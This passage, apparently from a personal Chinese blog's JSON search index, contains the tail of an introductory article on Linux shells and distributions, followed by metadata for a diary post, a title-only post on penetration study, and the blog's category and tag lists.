也可以将多个shell命令放入文件中作为程序执行，这些文件被称作shell脚本。你在命令行上执行的任何命令都可放进一个shell脚本中作为一组命令执行。这为创建那种需要把几个命令放在一起来工作的工具提供了便利。 ​ linux有好几种版本的shell，默认的是bash shell。 1.2 Linux系统分类​ Linux主要的系统可以分为两类：Debian和Redhat，话有一些其他的自由发布的版本。 ​ Debian系列主要有Debian、Ubuntu等。 ​ Redhat系列主要有Redhat、CentOs等。 ​ 不同的系统版本某些命令可能是不一样的，比如 Debian 使用 apt-get来安装包，但CentOs使用 yum。 第一张就是简要介绍一下什么是linux shell以及常见的发行版本。下一章，将详细讲解shell的使用。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"渗透学习","slug":"渗透","date":"2022-01-14T05:30:01.000Z","updated":"2022-01-16T08:41:44.414Z","comments":true,"path":"posts/myh10001.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10001.html","excerpt":"","text":"","categories":[{"name":"网安","slug":"网安","permalink":"https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"}],"author":"myh"},{"title":"hello","slug":"hello","date":"2022-01-14T02:21:39.000Z","updated":"2022-01-20T08:58:56.851Z","comments":true,"path":"posts/myh10000.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10000.html","excerpt":"","text":"Day1hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习! 大概更新的学习内容会有CTF，渗透，机器学习，python，Java的相关知识，期待您的来访~","categories":[{"name":"日常","slug":"日常","permalink":"https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"diary","slug":"diary","permalink":"https://huhu-myh.github.io/tags/diary/"}],"author":"myh"}],"categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"},{"name":"ASC","slug":"ASC","permalink":"https://huhu-myh.github.io/categories/ASC/"},{"name":"运维","slug":"运维","permalink":"https://huhu-myh.github.io/categories/%E8%BF%90%E7%BB%B4/"},{"name":"网安","slug":"网安","permalink":"https://huhu-myh.github.io/categories/%E7%BD%91%E5%AE%89/"},{"name":"日常","slug":"日常","permalink":"https://huhu-myh.github.io/categories/%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"},{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"},{"name":"MPI","slug":"MPI","permalink":"https://huhu-myh.github.io/tags/MPI/"},{"name":"渗透","slug":"渗透","permalink":"https://huhu-myh.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"diary","slug":"diary","permalink":"https://huhu-myh.github.io/tags/diary/"}]}